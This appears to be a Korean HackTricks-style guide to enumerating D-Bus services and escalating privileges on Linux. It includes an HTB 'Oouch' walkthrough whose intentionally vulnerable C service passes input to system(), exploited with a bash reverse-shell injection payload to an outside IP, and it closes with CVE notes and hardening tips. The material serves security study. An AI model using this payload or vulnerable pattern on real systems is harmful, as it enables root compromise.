# D-Bus Enumeration 및 Command Injection Privilege Escalation

## **GUI enumeration**

D-Bus는 Ubuntu desktop 환경에서 프로세스 간 통신(IPC) mediator로 사용됩니다. Ubuntu에서는 여러 message bus가 동시에 작동합니다. 하나는 주로 **시스템 전반에서 관련된 서비스를 노출하기 위해 privileged services가 사용하는 system bus**이며, 다른 하나는 로그인한 각 user를 위한 session bus로, 해당 user에게만 관련된 서비스를 노출합니다. 여기서는 주로 system bus에 초점을 맞춥니다. system bus는 더 높은 privilege(예: root)로 실행되는 services와 연결되어 있기 때문이며, 우리의 목표는 privileges를 elevate하는 것입니다. D-Bus의 architecture는 각 session bus마다 하나의 'router'를 사용하며, 이 router는 client가 통신하려는 service에 대해 지정한 address를 기반으로 client messages를 적절한 services로 redirect합니다.<sup>[[1]](#references)</sup>

D-Bus의 services는 노출하는 **objects**와 **interfaces**로 정의됩니다. Objects는 일반적인 OOP 언어의 class instances와 유사하며, 각 instance는 **object path**로 고유하게 식별됩니다. 이 path는 filesystem path와 유사하게 service가 노출하는 각 object를 고유하게 식별합니다. 연구 목적에 중요한 interface는 **org.freedesktop.DBus.Introspectable** interface이며, 여기에는 Introspect라는 단일 method가 포함됩니다. 이 method는 object가 지원하는 methods, signals 및 properties를 XML representation으로 반환합니다. 여기서는 properties와 signals를 제외하고 methods에 초점을 맞춥니다.

D-Bus interface와 통신하기 위해 두 가지 tools를 사용했습니다. 하나는 scripts에서 D-Bus가 노출하는 methods를 쉽게 invoke하기 위한 CLI tool인 **gdbus**이고, 다른 하나는 각 bus에서 사용 가능한 services를 enumerate하고 각 service에 포함된 objects를 표시하도록 설계된 Python 기반 GUI tool인 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)입니다.
```bash
sudo apt-get install d-feet
```
**session bus**를 확인하는 경우 먼저 현재 주소를 확인하세요:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

첫 번째 이미지에는 D-Bus system bus에 등록된 services가 표시되어 있으며, System Bus 버튼을 선택한 후 **org.debin.apt**가 특별히 강조되어 있습니다. D-Feet는 이 service에 objects를 쿼리하고, 두 번째 이미지에서 볼 수 있듯이 선택한 objects의 interfaces, methods, properties 및 signals를 표시합니다. 각 method의 signature도 자세히 표시됩니다.

주목할 만한 기능은 service의 **process ID (pid)**와 **command line**을 표시하는 것입니다. 이는 service가 elevated privileges로 실행되는지 확인하는 데 유용하며, research relevance에 중요합니다.

**D-Feet는 method invocation도 허용합니다**: 사용자는 parameters로 Python expressions를 입력할 수 있으며, D-Feet는 이를 D-Bus types로 변환한 후 service에 전달합니다.

하지만 일부 methods는 invocation을 허용하기 전에 authentication을 요구한다는 점에 유의해야 합니다. 애초에 우리의 목표는 credentials 없이 privileges를 elevate하는 것이므로 이러한 methods는 무시하겠습니다.

또한 일부 services는 사용자가 특정 actions를 수행하도록 허용되어야 하는지 여부를 다른 D-Bus service인 org.freedeskto.PolicyKit1에 쿼리한다는 점에 유의해야 합니다.

## **Cmd line Enumeration**

### List Service Objects

다음 명령을 사용하여 열려 있는 D-Bus interfaces를 나열할 수 있습니다:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`**로 표시된 Services는 특히 주의해서 살펴볼 가치가 있습니다. 아직 **실행 중이 아니지만**, bus 요청을 통해 필요할 때 시작할 수 있기 때문입니다. `busctl list`에서 멈추지 말고, 해당 이름을 실제로 실행될 binary와 매핑하세요.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
이는 activatable name에 대해 어떤 `Exec=` 경로가 어떤 identity로 시작되는지 빠르게 알려 줍니다. binary 또는 해당 실행 chain이 제대로 보호되지 않는다면, inactive service도 여전히 privilege-escalation 경로가 될 수 있습니다.

#### Connections

[Wikipedia에서:](https://en.wikipedia.org/wiki/D-Bus) process가 bus에 대한 connection을 설정하면 bus는 해당 connection에 _unique connection name_이라는 특별한 bus name을 할당합니다. 이 유형의 bus name은 변경할 수 없습니다. connection이 존재하는 동안 변경되지 않는 것이 보장되며, 더 중요한 점은 bus의 lifetime 동안 재사용할 수 없다는 것입니다. 즉, 동일한 process가 bus에 대한 connection을 종료한 후 새 connection을 생성하더라도, 다른 connection에는 이러한 unique connection name이 할당되지 않습니다. Unique connection name은 일반적으로 금지된 colon character로 시작하므로 쉽게 식별할 수 있습니다.<sup>[[4]](#references)</sup>

### Service Object Info

그런 다음 다음 명령을 사용해 interface에 대한 일부 정보를 얻을 수 있습니다:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
또한 bus name을 해당 `systemd` unit 및 executable path와 연관시킵니다:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
이는 privesc 중 중요한 operational question에 대한 답입니다. **method call이 성공하면 어떤 실제 binary와 unit이 해당 action을 수행하는가?**

### Service Object의 Interfaces 나열

충분한 permissions가 있어야 합니다.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Service Object의 Introspect Interface

이 예제에서는 `tree` parameter를 사용하여 검색된 최신 interface가 선택되었다는 점에 유의하세요 (_이전 섹션 참조_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
`htb.oouch.Block` interface의 `.Block` method(우리가 관심 있는 대상)에 주목하세요. 다른 열에 있는 "s"는 string을 예상한다는 의미일 수 있습니다.

위험한 작업을 시도하기 전에 **read-oriented** 또는 그 외 low-risk method를 먼저 검증하세요. 이렇게 하면 잘못된 syntax, 도달 가능하지만 거부됨, 도달 가능하며 허용됨이라는 세 가지 경우를 명확히 구분할 수 있습니다.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus Methods와 Policies 및 Actions 상관관계 분석

Introspection은 **무엇을** 호출할 수 있는지는 알려 주지만, 호출이 **왜** 허용되거나 거부되는지는 알려 주지 않습니다. 실제 privesc triage에서는 일반적으로 **세 가지 계층을 함께** 검사해야 합니다.

1. **Activation metadata** (`.service` 파일 또는 `SystemdService=`)를 확인하여 실제로 실행될 binary와 unit을 파악합니다.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`)를 확인하여 누가 `own`, `send_destination` 또는 `receive_sender`를 수행할 수 있는지 파악합니다.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`)를 확인하여 기본 authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`)을 파악합니다.

유용한 commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
D-Bus method와 Polkit action 간에 1:1 매핑이 있다고 **가정하지 마세요.** 동일한 method라도 수정되는 object 또는 runtime context에 따라 다른 action을 선택할 수 있습니다. 따라서 실제 workflow는 다음과 같습니다.

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` 및 관련 `.policy` 파일에서 grep
3. `busctl call`, `gdbus call` 또는 `dbusmap --enable-probes --null-agent`를 사용한 low-risk live probes

특히 Proxy 또는 compatibility service에 주의를 기울여야 합니다. 자체적으로 미리 수립한 connection을 통해 다른 D-Bus service로 request를 전달하는 **root-running proxy**는 원래 caller identity를 다시 검증하지 않는 경우, backend가 모든 request를 UID 0에서 온 것으로 잘못 처리하게 만들 수 있습니다.<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

충분한 privileges가 있으면 (`send_destination` 및 `receive_sender` privileges만으로는 충분하지 않음) **D-Bus communication을 monitor**할 수 있습니다.

**communication을 monitor**하려면 **root**가 되어야 합니다. root인 상태에서도 문제가 계속 발생한다면 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 및 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)를 확인하세요.

> [!WARNING]
> D-Bus config file을 구성하여 **non root users가 communication을 sniff하도록 허용하는 방법**을 알고 있다면 **저에게 연락해 주세요!**

monitor하는 다양한 방법:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
다음 예제에서는 인터페이스 `htb.oouch.Block`이 모니터링되고, **메시지 "**_**lalalalal**_**"가 miscommunication을 통해 전송됩니다**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Wireshark에서 열 수 있는 **pcapng** 파일에 결과를 저장하려면 `monitor` 대신 `capture`를 사용할 수 있습니다:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### 모든 noise 필터링 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

bus에 정보가 너무 많다면 다음과 같이 match rule을 전달합니다:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
여러 규칙을 지정할 수 있습니다. 메시지가 _어느 하나의_ 규칙과 일치하면 해당 메시지가 출력됩니다. 예시는 다음과 같습니다:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
자세한 match rule 구문은 [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)을 참조하세요.<sup>[[7]](#references)</sup>

### More

`busctl`에는 더 많은 옵션이 있습니다. [**여기에서 모든 옵션을 확인하세요**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

HTB의 호스트 "oouch"에서 **qtc 사용자**로서 _/etc/dbus-1/system.d/htb.oouch.Block.conf_에 위치한 **예상하지 못한 D-Bus config 파일**을 찾을 수 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
이전 설정에서 **이 D-BUS communication을 통해 정보를 보내고 받으려면 `root` 또는 `www-data` user여야 한다는 점을 확인할 수 있습니다.**

Docker container **aeb4525789d8** 내부에서 user **qtc**로 _/code/oouch/routes.py_ 파일에 일부 dbus 관련 code가 있는 것을 확인할 수 있습니다. 다음은 해당 code입니다:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
보시다시피, **D-Bus interface에 연결**하고 **"Block" function**에 "client_ip"를 전송합니다.

D-Bus connection의 반대편에서는 일부 C compiled binary가 실행되고 있습니다. 이 코드는 **D-Bus connection에서 IP address를 수신하고 `system` function을 통해 iptables를 호출**하여 전달받은 IP address를 차단합니다.\
**`system` 호출은 command injection에 취약하도록 의도적으로 작성**되었으므로, 다음과 같은 payload는 reverse shell을 생성합니다: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

이 페이지의 끝에서 **D-Bus application의 전체 C code**를 확인할 수 있습니다. 그 안의 91-97번째 줄에서 **`D-Bus object path`**와 **`interface name`**이 **등록되는 방식**을 확인할 수 있습니다. 이 정보는 D-Bus connection으로 정보를 전송하는 데 필요합니다:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
또한 57번째 줄에서 이 D-Bus 통신에 등록된 **유일한 method**의 이름이 `Block`임을 확인할 수 있습니다(_**따라서 다음 섹션에서는 payload가 service object `htb.oouch.Block`, interface `/htb/oouch/Block`, method name `Block`으로 전송됩니다**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

다음 python 코드는 `block_iface.Block(runme)`을 통해 `Block` method로 payload를 D-Bus connection에 전송합니다 (_이 코드는 이전 코드 블록에서 추출되었음에 유의하세요_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl 및 dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send`는 “Message Bus”로 메시지를 보내는 데 사용되는 tool입니다.
- Message Bus – 시스템이 애플리케이션 간 통신을 쉽게 수행하도록 사용하는 software입니다. Message Queue(메시지가 순서대로 정렬됨)와 관련이 있지만, Message Bus에서는 메시지가 subscription model로 전송되며 매우 빠릅니다.
- “-system” tag는 session message가 아닌 system message임을 나타내는 데 사용됩니다(기본값).
- “–print-reply” tag는 메시지를 적절히 출력하고 모든 reply를 사람이 읽을 수 있는 형식으로 수신하는 데 사용됩니다.
- “–dest=Dbus-Interface-Block”은 Dbus interface의 주소입니다.
- “–string:” – interface로 보내려는 메시지의 type입니다. double, bytes, booleans, int, objpath 등 메시지를 보내는 여러 형식이 있습니다. 이 중 “object path”는 file의 path를 Dbus interface로 보내려 할 때 유용합니다. 이 경우 특수 file(FIFO)을 사용하여 file 이름으로 interface에 command를 전달할 수 있습니다. “string:;” – FIFO reverse shell file/command를 배치한 object path를 다시 호출하기 위한 것입니다.

_`htb.oouch.Block.Block`에서 첫 번째 부분(`htb.oouch.Block`)은 service object를 참조하고 마지막 부분(`.Block`)은 method name을 참조한다는 점에 유의하세요._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

대규모 D-Bus attack surface를 `busctl`/`gdbus`로 수동 열거하면 빠르게 번거로워집니다. 최근 몇 년 동안 출시된 두 가지 소형 FOSS utility를 사용하면 red-team 또는 CTF engagement 중 작업 속도를 높일 수 있습니다:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C로 작성되었으며, 모든 object path를 순회하고 `Introspect` XML을 가져온 뒤 이를 소유한 PID/UID에 매핑하는 단일 static binary(<50 kB)입니다.<sup>[[5]](#references)</sup>
* 유용한 flags:
```bash
# *system* bus의 모든 service를 나열하고 호출 가능한 모든 method를 출력
sudo dbus-map --dump-methods

# Polkit prompt 없이 접근할 수 있는 method/property를 적극적으로 probe
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* 이 tool은 보호되지 않은 well-known name을 `!`로 표시하므로, 사용자가 *own*할 수 있는 service(take over) 또는 unprivileged shell에서 접근 가능한 method call을 즉시 확인할 수 있습니다.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* systemd unit의 *writable* path와 과도하게 permissive한 D-Bus policy file(예: `send_destination="*"`)을 찾는 Python-only script입니다.<sup>[[6]](#references)</sup>
* 빠른 사용법:
```bash
python3 uptux.py -n          # 모든 check를 실행하지만 log file은 작성하지 않음
python3 uptux.py -d          # verbose debug output 활성화
```
* D-Bus module은 아래 directory를 검색하고, 일반 사용자가 spoof하거나 hijack할 수 있는 service를 강조 표시합니다:
* `/etc/dbus-1/system.d/` 및 `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor override)

---

## 주목할 만한 D-Bus Privilege-Escalation Bugs (2024-2025)

최근 공개된 CVE를 주시하면 custom code에서 유사한 insecure pattern을 발견하는 데 도움이 됩니다. 최근의 좋은 예시는 다음 두 가지입니다:<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root로 실행되는 service가 unprivileged user가 재구성할 수 있는 D-Bus interface를 노출했으며, attacker가 제어하는 macro behavior를 로드하는 기능도 포함되어 있었습니다. | daemon이 system bus에서 **device/profile/config management**를 노출한다면, writable configuration과 macro feature를 단순한 "settings"가 아니라 code-execution primitive로 취급해야 합니다. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root로 실행되는 compatibility proxy가 원래 caller의 security context를 보존하지 않은 채 backend service로 request를 전달했기 때문에, backend는 proxy를 UID 0으로 신뢰했습니다. | **proxy / bridge / compatibility** D-Bus service를 별도의 bug class로 취급해야 합니다. privileged call을 relay하는 경우 caller UID/Polkit context가 backend에 어떻게 전달되는지 확인해야 합니다. |

다음 pattern에 주목하세요:
1. Service가 **system bus에서 root로 실행**됩니다.
2. **authorization check가 없거나**, check가 **잘못된 subject**를 대상으로 수행됩니다.
3. 접근 가능한 method가 결국 package install, user/group 변경, bootloader config, device profile update, file write 또는 direct command execution 등 system state를 변경합니다.

`dbusmap --enable-probes` 또는 수동 `busctl call`을 사용해 method에 접근 가능한지 확인한 다음, service의 policy XML과 Polkit action을 검사하여 실제로 **어떤 subject**가 authorization되는지 파악하세요.

---

## Hardening & Detection Quick-Wins

* world-writable 또는 *send/receive*-open policy 검색:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 위험한 method에는 Polkit을 요구하세요. 심지어 *root* proxy도 자신의 PID가 아니라 *caller* PID를 `polkit_authority_check_authorization_sync()`에 전달해야 합니다.
* 장시간 실행되는 helper에서는 privilege를 제거하세요(`sd_pid_get_owner_uid()`를 사용해 bus에 연결한 후 namespace를 전환).
* service를 제거할 수 없다면 최소한 전용 Unix group으로 *scope*를 제한하고 XML policy에서 access를 제한하세요.
* Blue-team: `busctl capture > /var/log/dbus_$(date +%F).pcapng`로 system bus를 캡처한 뒤 Wireshark로 가져와 anomaly detection을 수행하세요.

---

## References

- [1] [Ubuntu Desktop의 USBCreator D-Bus Privilege Escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service가 모든 unprivileged user의 configuration을 허용](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service의 Authentication Bypass (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "D-Bus용 Nmap"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
